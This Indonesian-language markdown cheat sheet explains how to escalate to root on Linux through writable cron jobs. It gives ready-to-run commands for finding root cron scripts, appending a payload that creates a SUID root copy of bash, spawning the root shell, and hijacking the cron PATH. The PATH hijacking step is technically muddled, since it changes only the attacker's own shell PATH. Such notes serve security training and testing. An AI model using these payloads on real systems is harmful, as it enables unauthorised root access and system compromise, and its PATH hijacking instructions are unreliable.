# ⏰ Writable Cron (Privilege Escalation via Cron Job)

> **Tujuan:** Memodifikasi **cron job** yang dijalankan sebagai **root** untuk mendapatkan **root shell** atau **root‑owned SUID binary**.

---

## 📌 Penjelasan Singkat

Jika sebuah **cron job** menjalankan script yang **writable** oleh user biasa, attacker dapat menyisipkan payload yang akan dieksekusi sebagai **root** ketika cron berjalan.

---

## 🛡️ Temukan Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
```

Perhatikan baris seperti:

```text
* * * * * root /opt/backup.sh
```

---

## 🔍 Cari Script Writable

```bash
ls -la /opt/backup.sh
# Cek apakah permission: -rwxrwxr-x (group/world-writable)
# Cek apakah owner group cocok dengan group user kita
```

Contoh vulnerable:

```text
-rwxrwxr-x 1 root developers 220 Aug 28 02:00 /opt/backup.sh
```

User dalam group `developers` dapat menulis file ini.

---

## 💥 Inject Payload

```bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /opt/backup.sh
```

Payload di atas akan:

1. Menyalin `/bin/bash` ke `/tmp/rootbash`.
2. Mengatur SUID bit (`4755`) agar file berjalan dengan euid **root**.

---

## ⏳ Tunggu Cron Berjalan

Tunggu cron dieksekusi (umumnya dalam 1 menit), lalu jalankan:

```bash
/tmp/rootbash -p
# -p WAJIB untuk mempertahankan euid root
```

Verifikasi privilege:

```bash
id
# uid=0(root) euid=0(root)
```

---

## 🧨 PATH Hijacking

Cek juga apakah cron memanggil command **tanpa full path**. Misalnya:

```text
* * * * * root backup.sh
```

Jika `PATH` cron memuat direktori yang dapat ditulis user, attacker dapat membuat file `backup.sh` palsu di direktori tersebut.

```bash
# Tambahkan di awal PATH
PATH=/tmp:$PATH

# Buat file palsu
echo '#!/bin/bash
cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > /tmp/backup.sh
chmod +x /tmp/backup.sh
```

Cron akan menjalankan `/tmp/backup.sh` (file attacker) alih‑alih `/usr/bin/backup.sh`.

---

## 🪜 Alur Eksploitasi

```text
Cari cron jobs
     ↓
Identifikasi script yang dijalankan root
     ↓
Cek apakah script writable oleh user
     ↓
Inject payload ke script
     ↓
Tunggu cron dieksekusi
     ↓
Verifikasi root
```

---

## 📋 Checklist Writable Cron

- [ ] Inspect `/etc/crontab` dan `/etc/cron.d/`.
- [ ] Identifikasi script yang dijalankan **root**.
- [ ] Cek permission script (group/world‑writable?).
- [ ] Inject payload (contoh: copy bash + SUID).
- [ ] Tunggu cron berjalan.
- [ ] Eksekusi binary SUID dengan `-p`.
- [ ] Verifikasi dengan `id` → `uid=0(root) euid=0(root)`.
- [ ] Periksa juga potensi **PATH hijacking**.

---

## 📚 Referensi

- [OWASP – Privilege Escalation Cheat Sheet](https://owasp.org/www-project-privilege-escalation-cheat-sheet)
- [GTFOBins – Shell Privilege Escalation](https://gtfobins.github.io/)
- [Linux Man Page – crontab(5)](https://man7.org/linux/man-pages/man5/crontab.5.html)
